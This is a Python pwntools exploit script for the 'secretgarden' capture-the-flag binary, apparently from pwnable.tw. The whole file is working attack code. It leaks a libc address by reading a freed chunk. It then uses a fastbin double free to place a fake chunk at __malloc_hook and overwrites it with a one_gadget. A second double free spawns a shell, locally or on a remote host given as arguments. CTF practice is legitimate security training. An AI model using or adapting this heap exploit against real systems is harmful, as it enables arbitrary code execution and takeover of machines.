#/usr/env/bin python
#-*- coding: utf-8 -*- 
from pwn import *
import sys

def raise_flower(Length,Name,Color):
    io.sendlineafter('Your choice : ',str(1))
    io.sendlineafter('Length of the name :',str(Length))
    io.sendafter('The name of flower :',Name)
    io.sendlineafter('The color of the flower :',Color)
    io.recvuntil('Successful !\n')

def visit_garden():
    io.sendlineafter('Your choice : ',str(2))

def remove_flower(Index):
    io.sendlineafter('Your choice : ',str(3))
    io.sendlineafter('remove from the garden:',str(Index))

def clean_garden():
    io.sendlineafter('Your choice : ',str(4))
    io.recvuntil('Done!\n')

def leave():
    io.sendlineafter('Your choice : ',str(5))

def exploit(flag):
    #leaking libc_address
    raise_flower(0x100,'aaaa','0000')
    raise_flower(0x100,'bbbb','1111')
    remove_flower(0)
    raise_flower(0xc8,'x','0000')
    visit_garden()
    io.recvuntil('Name of the flower[2] :')
    if flag==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c4c78
        log.info('libc_address:'+hex(libc.address))
        one_gadget = libc.address+0xf02a4
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x3c3c78
        log.info('libc_address:'+hex(libc.address))
        one_gadget = libc.address+0xef6c4 
    log.info('one_gadget:'+hex(one_gadget))
    system = libc.symbols['system']
    '''
    log.info('system:'+hex(system))
    binsh_addr = next(libc.search('/bin/sh'))
    log.info('binsh_address:'+hex(binsh_addr))
    __free_hook = libc.symbols['__free_hook']
    log.info('__free_hook:'+hex(__free_hook))
    '''
    __malloc_hook=libc.symbols['__malloc_hook']
    log.info('__malloc_hook:'+hex(__malloc_hook))

    remove_flower(1)
    remove_flower(2)
    clean_garden()
    visit_garden()
    io.recvuntil('No flower in the garden !\n')

    #Fastbin Attack
    raise_flower(0x60,'a'*0x60,'0')
    raise_flower(0x60,'b'*0x60,'1')
    remove_flower(0)
    remove_flower(1)
    remove_flower(0)
    raise_flower(0x60,p64(__malloc_hook-0x23),'2')
    raise_flower(0x60,'c'*0x60,'3')
    raise_flower(0x60,'d'*0x60,'4')

    payload = 'a'*0x13
    payload += p64(one_gadget)
    raise_flower(0x60,payload,'5')

    #Trigger malloc_hook
    log.info('Trigger malloc_hook...')
    remove_flower(0)
    gdb.attach(io)
    remove_flower(0)
    io.interactive()


if __name__ == "__main__":
    context.binary = "./secretgarden"
    #context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./secretgarden')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc=ELF('./libc.so.6')
        exploit(0)
    else:
        io = process('./secretgarden')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #proc_base = io.libs()['/mnt/hgfs/Binary/CTF/Shooting/pwnable.tw/secretgarden/workspace/secretgarden']
        #log.info('proc_base:'+hex(proc_base))
        #libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
        #log.info('libc_base:'+hex(libc_base))
        exploit(1)

